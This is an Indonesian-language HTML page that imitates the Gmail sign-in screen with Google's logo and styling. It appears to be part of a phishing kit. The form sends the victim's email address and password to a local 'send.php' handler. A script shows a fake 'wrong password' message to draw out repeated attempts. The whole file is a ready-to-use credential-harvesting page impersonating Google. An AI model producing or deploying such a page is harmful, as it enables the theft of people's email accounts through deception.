<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Gmail - Masuk</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .card{max-width:450px;width:100%;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;background:#fff}
        .logo{text-align:center;margin-bottom:32px}
        .logo img{width:75px}
        h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:16px}
        .input-group{margin-bottom:24px}
        input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none}
        input:focus{border-color:#1a73e8}
        button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px;font-size:14px;font-weight:500;width:100%;cursor:pointer}
        button:hover{background:#1765cc}
        .error{color:#d93025;font-size:14px;text-align:center;margin-top:8px}
        footer{margin-top:32px;font-size:12px;color:#5f6368;text-align:center}
    </style>
</head>
<body>
<div class="card">
    <div class="logo"><img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x.png" alt="Gmail"></div>
    <h1>Masuk</h1>
    <form method="POST" action="send.php">
        <div class="input-group"><input type="email" name="email" placeholder="Email atau nomor telepon" required autofocus></div>
        <div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
        <button type="submit">Berikutnya</button>
    </form>
    <div class="error" id="msg"></div>
    <footer>Gmail adalah merek dagang Google Inc.</footer>
</div>
<script>
    if (window.location.search.includes('error=1')) {
        document.getElementById('msg').innerText = 'Kombinasi email dan password salah. Coba lagi.';
    }
</script>
</body>
</html>
